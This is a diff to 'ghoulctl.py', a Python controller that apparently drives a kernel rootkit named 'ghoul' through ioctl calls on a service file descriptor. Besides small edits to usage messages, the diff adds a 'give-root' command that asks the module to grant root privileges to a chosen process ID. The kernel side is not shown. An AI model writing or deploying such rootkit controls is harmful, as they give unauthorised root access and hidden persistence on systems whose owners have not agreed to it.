@@ -13,6 +13,7 @@ SERVICE_UNLOAD = 1
 SERVICE_CHANGE_FD = 2
 SERVICE_PING = 3
 SERVICE_CHANGE_PING_ARG = 4
+SERVICE_GIVE_ROOT = 5
 
 PING_ARG = int(os.environ.get('GHOUL_PING_ARG', 0)) or 666
 
@@ -31,7 +32,7 @@ def unload():
 
 def change_fd():
     if len(sys.argv) != 3:
-        print('Usage: ./ghoulctl.py change-fd [NEW_FD]')
+        print('Usage: ./ghoulctl.py change-fd NEW_FD')
         exit()
     ioctl(SERVICE_FD, SERVICE_CHANGE_FD, int(sys.argv[2]))
 
@@ -46,14 +47,22 @@ def ping():
 
 def change_ping_arg():
     if len(sys.argv) != 3:
-        print('Usage: ./ghuolctl.py change-ping-arg [NEW_ARG]')
+        print('Usage: ./ghuolctl.py change-ping-arg NEW_ARG')
         exit()
     ioctl(SERVICE_FD, SERVICE_CHANGE_PING_ARG, int(sys.argv[2]))
 
 
+def give_root():
+    try:
+        pid = int(sys.argv[2])
+    except IndexError:
+        pid = 0
+    ioctl(SERVICE_FD, SERVICE_GIVE_ROOT, pid)
+
+
 def main():
     if len(sys.argv) < 2:
-        print('ERROR: expected a command')
+        print('Usage: ./ghoulctl.py COMMAND [ARGS]...')
         exit()
     cmd = sys.argv[1]
 
@@ -67,8 +76,10 @@ def main():
         ping()
     elif cmd == 'change-ping-arg':
         change_ping_arg()
+    elif cmd == 'give-root':
+        give_root()
     else:
-        print(f'unknown command {cmd}')
+        print(f'ERROR: unknown command {cmd}')
 
 
 if __name__ == '__main__':
